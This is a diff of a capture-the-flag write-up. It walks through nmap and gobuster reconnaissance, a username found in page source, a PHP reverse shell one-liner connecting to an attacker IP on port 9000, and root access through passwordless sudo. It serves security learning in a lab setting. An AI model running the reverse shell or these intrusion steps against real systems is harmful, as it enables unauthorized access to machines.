@@ -11,9 +11,9 @@ The target IP address was: 10.114.180.176
 
 ## 1. Reconnaissance: 🔍
 I initially performed enumeration with Nmap to identify open ports and services, version and OS on the target machine by using the following command:
-
+```bash
 nmap 10.114.180.176 -sV -sC -T5 -p- -A -O -o ~/active/output/nmap_result.txt
-
+```
 The scan revealed:
 - Port 22: SSH
 - Port 80: HTTP (web application)
@@ -26,8 +26,9 @@ I opened the source code and there was a note containing a username:
 The note said: "Note to self, remember username! Username: R1ckRul3s"
 
 I saved it using:
-
+```bash
 echo "Username: R1ckRul3s" > output/creds.txt
+```
 
 ---
 
@@ -35,9 +36,9 @@ echo "Username: R1ckRul3s" > output/creds.txt
 
 After accessing the web application, I used gobuster to look for more files and directories in to the web application.
 the command I used combined gobuster and the dirbuster directory:
-
+```bash
 gobuster dir -u 'http://10.114.180.176' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x .php,.txt,.js,.json -o ~/active/output/gobuster_result.txt
-
+```
 ❗ Please note that if you want to run the same command I used, the command takes a few minutes to finish execute due to the large number of words in the wordlist. I did configure the command to use 64 threads instead of the default 10 so it should make the process quicker.
 
 The scan results were successful with:
@@ -75,9 +76,9 @@ Using this access, I was able to find the current directory contents and by that
 
 I understood now the clue.txt saying I should look for the other flag and I preferred using the terminal for it so I made a reverse shell command.
 a simple bash one didn't work so I used a php one. the command was:
-
+```php
 php -r '$sock=fsockopen("192.168.132.219",9000);exec("sh <&3 >&3 2>&3");'
-
+```
 and I got access!
 <img width="3194" height="2526" alt="updated_reverse_shell" src="https://github.com/user-attachments/assets/579522f2-a6e9-4d6d-beef-afc8abc4b167" />
 
@@ -92,13 +93,13 @@ I used: cat "second ingredients" and got the second ingredients!
 ## 4. Privilege Escalation: 🚀
 
 For the last ingredient I wanted to look at the /root directory. I didn't have access so I checked which sudo commands I was able to run without needing a password using:
-
+```bash
 sudo -l
-
+```
 and found I can use all commands without password. I then opened a bash shell as root using:
-
+```bash
 sudo bash -i
-
+```
 Then, looked at the /root directory and found the 3rd file holding the last ingredient:
 
 <img width="3166" height="898" alt="last flag" src="https://github.com/user-attachments/assets/d50467de-16b6-4ae2-944a-d731381abed8" />
